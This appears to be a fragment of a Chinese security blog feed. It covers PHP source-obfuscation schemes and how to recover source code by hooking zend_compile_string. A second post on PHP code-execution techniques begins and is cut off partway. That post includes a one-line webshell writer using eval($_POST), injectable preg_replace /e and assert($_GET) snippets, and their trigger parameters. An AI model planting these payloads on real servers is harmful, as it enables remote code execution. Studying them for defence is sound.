plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">结果</span><br><span class="line">&lt;?php</span><br><span class="line">eval(gzinflate(base64_decode(&apos;S03OyFdQz0jNyclXSKpUyC0tTs3JylC3BgA=&apos;)));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">eval(base64_decode(&apos;S03OyFdQz0jNyclXSKpUyC0tTs3JylC3BgA=&apos;));</span><br><span class="line">`KMÎÈWPÏHÍÉÉWHªTÈ--NÍÉÊP·`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7) gzdeflate — Deflate a string</span><br><span class="line"></span><br><span class="line">gzdeflate ( string $data [, int $level = -1 [, int $encoding = ZLIB_ENCODING_RAW ]] ) : string</span><br><span class="line"></span><br><span class="line">（PHP 4&gt; = 4.0.4，PHP 5，PHP 7） gzinflate - </span><br><span class="line"></span><br><span class="line">gzinflate ( string $data [, int $length = 0 ] ) : string</span><br><span class="line"></span><br><span class="line">此函数会使收缩的字符串膨胀。</span><br></pre></td></tr></table></figure><p>2.使用变量代替函数名称 </p><p>比如定一串字符串变量通过从这串字符串中提取题目拼接而成</p><p>3.变量采用相似容易混淆或无法辨认的字符命名 </p><p>如$O00OO0 $O00O0O $O0OO00甚至使用ASCII码作为变量名</p><p>4.反劫持 </p><p>加密后增加判断当前文件MD5和原始加密文件的MD5是否相同的逻辑，防止尝试通过美化代码破解文件的操作</p><p>5.字符替换<br>通过随机秘钥替换字符达到混淆的目的</p><p>6.多层加密<br>通过多层的编码混淆增加破解复杂度</p><p>优点:不用安装额外扩展，可以直接运行 </p><p>缺点:加密效果比较差，因为代码最终都是通过eval执行，如果劫持eval可以100%还原。所以一般不推荐此种方法。</p><blockquote><p>phpjiami、zhaoyuanma的免费版本等</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2vy61xdtej30fi04mdgw.jpg" alt=""></p><p>比如 phpjiami加密源码的整个流程是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密流程：源码 -&gt; 加密处理（压缩，替换，BASE64，转义）-&gt; 安全处理（验证文件 MD5 值，限制 IP、限域名、限时间、防破解、防命令行调试）-&gt; 加密程序成品，</span><br></pre></td></tr></table></figure><p>再简单的说：源码 + 加密外壳 == 加密程序</p><p>加密处理无非是多次的压缩处理，转换加密我见过某变态程序对源码不集的加密转换，足足进行了50次操作。 要破解的人失去耐心。</p><p>MD5的方式，此方式较复杂。一般会将一段加密后的代码，判断MD5值，写入到PHP中。程序运行的时间读取这一段MD5值，并判断。如果值不相同则停止运行。</p><p>有的人想当然地认为修改eval为echo就能输出源码了，但实际上是不可以的因为他会校验其的MD5值。</p><p>限IP地址，某一些程序在某一些IP 上是不可运行的。某网站提供破解服务，这个网站的ip地址为：42.121.57.XX，在程序中发现这个IP黑名单则直接拒绝执行。</p><p>大概画风如这样(以phpjiami为例子)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">œèÒ9œèÒ9œèÒ9œèÒ9œèÒ9;</span><br><span class="line">œèÒ9œèÒ9œèÒ9œèÒ9;</span><br><span class="line">function a(一堆乱码)&#123;</span><br><span class="line">    b=乱码解密;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line">œèÒ9œèÒ9œèÒ9œèÒ9;</span><br><span class="line">œèÒ9œèÒ9œèÒ9œèÒ9;</span><br><span class="line">function b(b,...)&#123;</span><br><span class="line">        由乱码解密构成一堆全局变量 </span><br><span class="line">    ‡¾Üö´=eval；</span><br><span class="line">    œèÒ9æ8î=base64；</span><br><span class="line">    xxxx</span><br><span class="line">&#125;</span><br><span class="line">œèÒ9œèÒ9œèÒ9;œèÒ9</span><br><span class="line">œèÒ9œèÒ9œèÒ9;</span><br><span class="line">function c ()&#123;</span><br><span class="line">    安全处理</span><br><span class="line">&#125;</span><br><span class="line">œèÒ9œèÒ9œèÒ9œèÒ9;</span><br><span class="line">最后    ‡¾Üö´(œèÒ9æ8î(xxx(™¡óšÝï($§‡¾Üö´Õ°¾ãÑ(&apos;Ä4œèÒ9æ8î²4 ª78Øè6ŽDÔðìê´ŽÌ´òØ¦èØÐ’ÌŽ3ÊÔ6ð”’Ô8–7Î°¢26ŒÂÂâ¤0ô¨0¨Î2®â¤°7œ8ÄÈòØäª8Ø¬ŠÜÊÒè5B¨......)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如何进行解密？</p><p>这里我将提供两种我已知的思路进行讲解</p><p>1.调用 eval 等代码执行的函数，最终会调用 php 内核的<code>zend_compile_string</code>函数。</p><p>为什么最终会调用<code>zend_compile_string</code>函数呢？</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2veeo2jphj30pj0evq4r.jpg" alt=""></p><p>在中间代码的执行的时候，会经过<code>zend_execute(EG(active_op_array) TSRMLS_CC);</code></p><p>如果你是使用VS查看源码的话，将光标移到zend_execute并直接按F12， 你会发现zend_execute的定义跳转到了一个指针函数的声明<code>(Zend/zend_execute_API.c)。</code></p><p><code>ZEND_API void (*zend_execute)(zend_op_array *op_array TSRMLS_DC);</code></p><p>这是一个全局的函数指针，它的作用就是执行PHP代码文件解析完的转成的zend_op_array。</p><p> <code>在zend_execute函数指针赋值时，还有PHP的中间代码编译函数zend_compile_file（文件形式）和zend_compile_string(字符串形式)</code>。</p><p>所以呢，我们只用Hook住这个函数，就差不多了/其实貌似也可以直接修改<code>zend_compile_file</code>进行输出。</p><p>比如说</p><p>原来是这样</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2yac83kszj30ox0f374i.jpg" alt=""></p><p><code>eval(&#39;echo 1;&#39;);</code></p><p>最后得出结果为1 ，</p><p>但是eval换成var_dump</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2yaddwrmwj30qf0e8mxf.jpg" alt=""></p><p><code>var_dump(&#39;echo 1;&#39;);</code></p><p>最后结果就是</p><p><code>string(7) &quot;echo 1;&quot;</code></p><p>这样就可以获得源码了。</p><p>2.PHP在执行之前有一个编译的环节，编译的结果是opcode，然后由Zend虚拟机执行， 从这里看如果只要将源代码加密，然后在执行之前将代码解密即可。</p><p>3.手工dump法</p><p>4.动态调试法</p><p>5.代码审计Getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;index.php&quot;;</span><br><span class="line">var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure><p>从这里看，只要代码能被解密为opcode，那么总有可能反编译出来源代码， 其他的语言中也是类似，比如objdump程序能将二进制程序反汇编出来， .NET、Java的程序也是一样，都有一些反编译的程序，不过通常这些厂商同时还会 附带代码混淆的工具，经过混淆的代码可读性极差，很多人都留意过Gmail等网站 经过混淆的JS代码吧，他们阅读起来非常困难，经过混淆的代码即使反编译出来， 读者也很难通过代码分析出代码中的逻辑，这样也就极大的增加了应用的安全性。</p><p>简化的代码示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $code = file_get_contents(&apos;待加密的PHP&apos;);</span><br><span class="line">  $code = base64_encode(openssl_encrypt($code, &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));</span><br><span class="line">  echo &quot;&lt;?php eval(openssl_decrypt(base64_decode($code), &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));&quot;;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2vym7jsrhj30fk04dwft.jpg" alt=""></p><p>对于第一种思路，我们不需要知道数据的加密算法到底是什么，因为真实代码在执行时总会被解密出来，各位只需要知道PHP到底执行了什么，从这儿拿出代码。</p><p>不管是<code>eval</code>、<code>assert</code>、<code>preg_replace(&#39;//e&#39;)</code>，还是这类PHP加密扩展，想要动态执行代码就必须经过<code>zend_compile_string</code>这一个函数。只需要编写一个<code>dll/so</code>，给<code>zend_compile_string</code>挂上“钩子”，就能直接拿到完整的代码。</p><p>当然类似这样原理的加密在网上已经有很多非常成熟的在线解密方式。<a href="https://www.unphp.net/" target="_blank" rel="noopener">UnPHP</a>,当然我们主要是介绍如何如何hook住<code>zend_compile_string</code><br>理论上，只要我们在php内核执行eval函数的时候，将其dump出来，就可以得到源代码。在 php 扩展中, module init 的时候替换掉<code>zend_compile_string</code>，主要代码如下(tool.lu的站长xiaozi的代码),在php.ini中添加extension=hookeval.so，然后直接访问加密过的php代码即可</p><p>主要代码（全部代码<a href="http://php-security.org/downloads/evalhook-0.1.tar.gz" target="_blank" rel="noopener"> evalhook</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">static zend_op_array *edump_compile_string(zval *source_string, char *filename TSRMLS_DC)</span><br><span class="line">&#123;</span><br><span class="line">    int c, len;</span><br><span class="line">    char *copy;</span><br><span class="line"> </span><br><span class="line">    if (Z_TYPE_P(source_string) != IS_STRING) &#123;</span><br><span class="line">        return orig_compile_string(source_string, filename TSRMLS_CC);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    len  = Z_STRLEN_P(source_string);</span><br><span class="line">    copy = estrndup(Z_STRVAL_P(source_string), len);</span><br><span class="line">    if (len &gt; strlen(copy)) &#123;</span><br><span class="line">        for (c=0; c&lt;len; c++) if (copy[c] == 0) copy[c] == &apos;?&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    php_printf(&quot;----- [tool.lu start] -----\n&quot;);</span><br><span class="line">    php_printf(&quot;%s\n&quot;, copy);</span><br><span class="line">    php_printf(&quot;----- [tool.lu end] -----\n&quot;);</span><br><span class="line"> </span><br><span class="line">    yes = 1;</span><br><span class="line"></span><br><span class="line">    return orig_compile_string(source_string, filename TSRMLS_CC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP_MINIT_FUNCTION(edump)</span><br><span class="line">&#123;</span><br><span class="line">    if (edump_hooked == 0) &#123;</span><br><span class="line">        edump_hooked = 1;</span><br><span class="line">        orig_compile_string = zend_compile_string;</span><br><span class="line">        zend_compile_string = edump_compile_string;</span><br><span class="line">    &#125;</span><br><span class="line">    return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想要自己写出如上代码我们首先需要知道PHP是如何解析一个PHP文件的。<br>依旧是这个图<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2vij9m6f0j30je05t3zf.jpg" alt=""></p><p>即:词法分析 =&gt; 语法分析 =&gt; opcode编译 =&gt; 执行</p><blockquote><p>1.PHP的词法分析和语法分析的实现分别位于Zend目录下的zend_language_scanner.l和 zend_language_parser.y 文件，使用r2ec&amp;flex来编译。</p></blockquote><p>分析下语句</p><p>1.<code>static zend_op_array *edump_compile_string(zval *source_string, char *filename TSRMLS_DC)</code></p><p>在PHP中，函数分为俩种，</p><p>1.一种是<code>zend_internal_function</code>, 这种函数是由扩展或者Zend/PHP内核提供的，用’C/C++’编写的，可以直接执行的函数。</p><p>2.另外一种是<code>zend_user_function</code>, 这种函数呢，就是我们经常在见的，用户在PHP脚本中定义的函数，这种函数最终会被ZE翻译成opcode array来执行</p><p>首先在zend_compile.h可以看到如下结构</p><p>1.<code>typedef struct _zend_internal_function {</code></p><p>2.<code>struct _zend_op_array {</code></p><p>3.<code>typedef union _zend_function {</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">struct _zend_op_array &#123;</span><br><span class="line">    /* Common elements */</span><br><span class="line">    zend_uchar type;</span><br><span class="line">    char *function_name;</span><br><span class="line">    zend_class_entry *scope;</span><br><span class="line">    zend_uint fn_flags;</span><br><span class="line">    union _zend_function *prototype;</span><br><span class="line">    zend_uint num_args;</span><br><span class="line">    zend_uint required_num_args;</span><br><span class="line">    zend_arg_info *arg_info;</span><br><span class="line">    zend_bool pass_rest_by_reference;</span><br><span class="line">    unsigned char return_reference;</span><br><span class="line">    /* END of common elements */</span><br><span class="line"> </span><br><span class="line">    zend_uint *refcount;</span><br><span class="line"> </span><br><span class="line">    zend_op *opcodes;</span><br><span class="line">    zend_uint last, size;</span><br><span class="line"> </span><br><span class="line">    zend_compiled_variable *vars;</span><br><span class="line">    int last_var, size_var;</span><br><span class="line"> </span><br><span class="line">    zend_uint T;</span><br><span class="line"> </span><br><span class="line">    zend_brk_cont_element *brk_cont_array;</span><br><span class="line">    zend_uint last_brk_cont;</span><br><span class="line">    zend_uint current_brk_cont;</span><br><span class="line"> </span><br><span class="line">    zend_try_catch_element *try_catch_array;</span><br><span class="line">    int last_try_catch;</span><br><span class="line"> </span><br><span class="line">    /* static variables support */</span><br><span class="line">    HashTable *static_variables;</span><br><span class="line"> </span><br><span class="line">    zend_op *start_op;</span><br><span class="line">    int backpatch_count;</span><br><span class="line"> </span><br><span class="line">    zend_bool done_pass_two;</span><br><span class="line">    zend_bool uses_this;</span><br><span class="line"> </span><br><span class="line">    char *filename;</span><br><span class="line"> </span><br><span class="line">     zend_uint line_start;</span><br><span class="line">    zend_uint line_end;</span><br><span class="line">    char *doc_comment;</span><br><span class="line">    zend_uint doc_comment_len;</span><br><span class="line"> </span><br><span class="line">    void *reserved[ZEND_MAX_RESERVED_RESOURCES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(edump)</span><br><span class="line">&#123;</span><br><span class="line">    if (edump_hooked == 0) &#123;</span><br><span class="line">        edump_hooked = 1;</span><br><span class="line">        orig_compile_string = zend_compile_string;</span><br><span class="line">        zend_compile_string = edump_compile_string;</span><br><span class="line">    &#125;</span><br><span class="line">    return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP开始执行以后会经过两个主要的阶段：</p><p>处理请求之前的开始阶段和请求之后的结束阶段。</p><p>开始阶段有两个过程：第一个过程是模块初始化阶段（MINIT），</p><p>在整个SAPI生命周期内(例如Apache启动以后的整个生命周期内或者命令行程序整个执行过程中)， 该过程只进行一次。第二个过程是模块激活阶段（RINIT），该过程发生在请求阶段，</p><p>例如通过url请求某个页面，则在每次请求之前都会进行模块激活（RINIT请求开始）。 例如PHP注册了一些扩展模块，则在MINIT阶段会回调所有模块的MINIT函数。 模块在这个阶段可以进行一些初始化工作，例如注册常量，定义模块使用的类等等。 模块在实现时可以通过如下宏来实现这些回调函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    // 注册常量或者类等初始化操作</span><br><span class="line">    return SUCCESS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何自己写一个类似的PHP解密扩展呢？</p><p>这里主要原理我觉得应该是先抄个var_dump函数，最后将这整个函数传给<br><code>PHP_MINIT_FUNCTION</code>,其中把<br><code>zend_compile_string</code>换成这个函数就可以了</p><p>实验将代码<code>eval(&#39;echo 1;&#39;);</code>输出的结果从1 变成<code>string(7) &quot;echo 1;&quot;</code></p><h3 id="有扩展的加密"><a href="#有扩展的加密" class="headerlink" title="有扩展的加密"></a>有扩展的加密</h3><p>此种加密原理是把源码通过des或aes等加密算法进行加密，当加密的源码执行时扩展会截获加密的代码并解密后交给zend执行。</p><p>优点:1.相比较免扩展加密更加安全，如果只是源码被窃取没有扩展与加密的key也是无法被破解的。 2.客户从目标机上down下来代码+beast.so扩展，因为绑定MAC地址的缘故，也是无法正常启动php-fpm的。</p><p>缺点:需要安装扩展才能使用，扩展可能会被破解拿到密钥。在zend层也可能会被劫持解密的源码。</p><blockquote><p><code>php-beast</code>、<code>php_screw、screw_plus</code>、<code>ZoeeyGuard</code>、<code>tonyenc</code>等市面上几乎所有的开源PHP加密扩展。</p></blockquote><p>有扩展加密中，php_screw因加密方式太弱，容易被已知明文攻击（举例：大部分PHP文件的开头均为<code>&lt;?php）</code>推测出密钥。其他的加密就都需要手动逆向，过于麻烦，直接使用通用方案来反而是更简单的破解方式。</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2xrr3i875j30fp048gmv.jpg" alt=""></p><p>转换为代码形式如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $code = file_get_contents(&apos;待加密的PHP&apos;);</span><br><span class="line">  $code = base64_encode(openssl_encrypt($code, &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));</span><br><span class="line">  echo &quot;&lt;?php eval(openssl_decrypt(base64_decode($code), &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# cd things/php-7.2.0/ext/</span><br><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~/things/php-7.2.0/ext# ./ext_skel --extname=php_museljh</span><br><span class="line">Creating directory php_museljh</span><br><span class="line">Creating basic files: config.m4 config.w32 .gitignore php_museljh.c php_php_museljh.h CREDITS EXPERIMENTAL tests/001.phpt php_museljh.php [done].</span><br><span class="line"></span><br><span class="line">To use your new extension, you will have to execute the following steps:</span><br><span class="line"></span><br><span class="line">1.  $ cd ..</span><br><span class="line">2.  $ vi ext/php_museljh/config.m4</span><br><span class="line">3.  $ ./buildconf</span><br><span class="line">4.  $ ./configure --[with|enable]-php_museljh</span><br><span class="line">5.  $ make</span><br><span class="line">6.  $ ./sapi/cli/php -f ext/php_museljh/php_museljh.php</span><br><span class="line">7.  $ vi ext/php_museljh/php_museljh.c</span><br><span class="line">8.  $ make</span><br><span class="line"></span><br><span class="line">Repeat steps 3-6 until you are satisfied with ext/php_museljh/config.m4 and</span><br><span class="line">step 6 confirms that your module is compiled into PHP. Then, start writing</span><br><span class="line">code and repeat the last two steps as often as necessary.</span><br><span class="line"></span><br><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~/things/php-7.2.0/ext#</span><br></pre></td></tr></table></figure><h3 id="扩展加密Opcodes-近似加密"><a href="#扩展加密Opcodes-近似加密" class="headerlink" title="扩展加密Opcodes(近似加密)"></a>扩展加密Opcodes(近似加密)</h3><p>此种加密原理是先编译成opcode再压缩执行.</p><p>优点：是三种加密方式中最安全的方式,理论上是无法被破解得到源码的。 </p><p>缺点: 不是绝对安全，可以通过OPCODE逆向转回PHP原代码,好的逆向效果在98%以上。</p><blockquote><p>Zend Guard、老版本ionCube和部分配置下的Swoole Compiler</p></blockquote><p>swoole complier是对编译以后的opcode作了手脚，也就是zend引擎在执行opcode之前需要完成解密的，或者是在执行过程中动态解密</p><h3 id="混淆加密"><a href="#混淆加密" class="headerlink" title="混淆加密"></a>混淆加密</h3><h3 id="无扩展虚拟机加密"><a href="#无扩展虚拟机加密" class="headerlink" title="无扩展虚拟机加密"></a>无扩展虚拟机加密</h3><h4 id="Zend虚拟机"><a href="#Zend虚拟机" class="headerlink" title="Zend虚拟机"></a>Zend虚拟机</h4><p>虚拟机（Virtual Machine），在计算机科学中的体系结构里，是指一种特殊的软件， 他可以在计算机平台和终端用户之间创建一种环境，而终端用户则是基于这个软件所创建的环境来操作软件。 在计算机科学中，虚拟机是指可以像真实机器一样运行程序的计算机的软件实现。虚拟机是一种抽象的计算机，它有自己的指令集，有自己的内存管理体系。</p><p>Zend引擎的核心文件都在$PHP_SRC/Zend/目录下面。不过最为核心的文件只有如下几个：</p><p>1.PHP语法实现</p><p>Zend/zend_language_scanner.l</p><p>Zend/zend_language_parser.y</p><p>2.Opcode编译</p><p>Zend/zend_compile.c</p><p>3.执行引擎</p><p>Zend/zend_vm_*</p><p>Zend/zend_execute.c</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">phpjiami 数种解密方法</a></p><p><a href="https://juejin.im/entry/5aea84ab6fb9a07ac76ea595" target="_blank" rel="noopener">解密混淆的PHP程序</a></p><p><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="noopener">PHPDecode 在线解密工具</a></p><p><a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="noopener">the Month of PHP Security</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/70174924" target="_blank" rel="noopener">PHP HOOK的若干方法</a></p><p><a href="https://www.anquanke.com/post/id/176767" target="_blank" rel="noopener">PHP代码加密面面观</a></p><p><a href="https://www.zybuluo.com/firesnow/note/624415#%E5%85%8D%E6%89%A9%E5%B1%95%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">php源码加密探究</a></p><p><a href="http://www.php-internals.com/book/?p=chapt07/07-04-source-code-encrypt" target="_blank" rel="noopener">PHP代码的加密解密</a></p><p><a href="https://www.kancloud.cn/kancloud/php-internals" target="_blank" rel="noopener">深入了解PHP内核</a></p><p><a href="http://type.so/c/php-dump-eval.html" target="_blank" rel="noopener">从 php 内核挂载钩子解密源码</a></p><p><a href="http://www.liqingbo.cn/blog-1325.html" target="_blank" rel="noopener">PHP免扩展加密(混淆加密)的基本原理(三)安全加密</a></p><p><a href="http://www.liqingbo.cn/blog-1324.html" target="_blank" rel="noopener">PHP免扩展加密(混淆加密)的基本原理(二)数据混淆</a></p><p><a href="https://blog.csdn.net/u013705066/article/details/82703940" target="_blank" rel="noopener">PHP代码加密+扩展解密实战</a></p><p><a href="https://github.com/liexusong/php-beast/issues/50" target="_blank" rel="noopener">php-beast issues</a></p>]]></content>
    
    <summary type="html">
    
      从零开始分析PHP代码加密原理
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="PHP内核分析" scheme="https://museljh.github.io/tags/PHP%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP代码加密" scheme="https://museljh.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP命令&amp;代码&amp;执行&amp;绕过</title>
    <link href="https://museljh.github.io/2019/05/15/%E5%91%BD%E4%BB%A4&amp;%E6%89%A7%E8%A1%8C&amp;%E7%BB%95%E8%BF%87/"/>
    <id>https://museljh.github.io/2019/05/15/命令&amp;执行&amp;绕过/</id>
    <published>2019-05-15T09:41:18.000Z</published>
    <updated>2019-07-15T15:33:08.106Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、命令执行-写shell"><a href="#一、命令执行-写shell" class="headerlink" title="一、命令执行/写shell"></a>一、命令执行/写shell</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a><code>eval</code></h3><h3 id="fputs"><a href="#fputs" class="headerlink" title="fputs"></a><code>fputs</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(&apos;t.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1])?&gt;&apos;)</span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace ===="></a><code>preg_replace</code> ====</h3><p><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>5.6以下可以执行</p><p>5.6以上仍然可以执行，但是会有警告</p><p>PHP7后已经不支持/e修饰符</p><p>2.1、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$regexp = $_GET[&apos;reg&apos;];</span><br><span class="line">$var = &apos;&lt;php&gt;phpinfo()&lt;/php&gt;&apos;;</span><br><span class="line">preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &apos;\\1&apos;, $var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>reg=%3C/php%3E/e</p><p>2.2、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>cmd=phpinfo()</p><p>2.3、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">preg_replace(&quot;/\s*\[php\](.+?)\[\/php\]\s*/ies&quot;, &quot;\\1&quot;, $_GET[&apos;h&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>h=[php]phpinfo()[/php]</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert() ===="></a><code>assert()</code> ====</h3><p><code>bool assert ( mixed $assertion [, string $description ] )</code></p><p>将字符串当成PHP代码执行</p><p>在PHP7后已经不是一个函数，而是一种语言结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">assert($_GET[&apos;pass&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>pass=phpinfo()</p><p>注意：phpinfo()可以不加分号;</p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" 